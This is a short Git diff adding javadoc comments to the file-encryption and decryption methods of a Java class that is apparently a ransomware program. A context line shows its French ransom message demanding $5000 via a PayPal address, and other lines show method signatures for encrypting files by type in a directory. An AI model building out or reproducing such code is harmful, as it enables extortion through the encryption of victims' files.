@@ -58,7 +58,12 @@ public class AESService {
         Logger.logInfo("Cet ordinateur est piraté, plusieurs fichiers ont été chiffrés, une rançon de 5000$ doit être payée sur le compte PayPal hacker@gmail.com pour pouvoir récupérer vos données.");
     }
 
-    // TODO : Add javadocs
+    /**
+     * @param directory Directory to encrypt files in
+     * @param fileTypes File types to encrypt
+     * @param key Key to encrypt files
+     * @param iv IV to encrypt files
+     */
     private static void encryptFiles(File directory, List<FileType> fileTypes, SecretKey key, IvParameterSpec iv) {
         // Get files matching file types to encrypt
         List<File> filesToEncrypt = FileUtils.getFiles(directory, fileTypes, false);
@@ -109,7 +114,12 @@ public class AESService {
         Logger.logInfo(String.format("Les fichiers ont été déchiffrés dans le répertoire %s", directory));
     }
 
-    // TODO : Add javadocs
+    /**
+     * @param directory Directory to decrypt files in
+     * @param fileTypes File types to decrypt
+     * @param key Key to decrypt files
+     * @param iv IV to decrypt files
+     */
     private static void decryptFiles(File directory, List<FileType> fileTypes, SecretKey key, IvParameterSpec iv) {
         // Get files matching file types to decrypt
         List<File> filesToDecrypt = FileUtils.getFiles(directory, fileTypes, true);
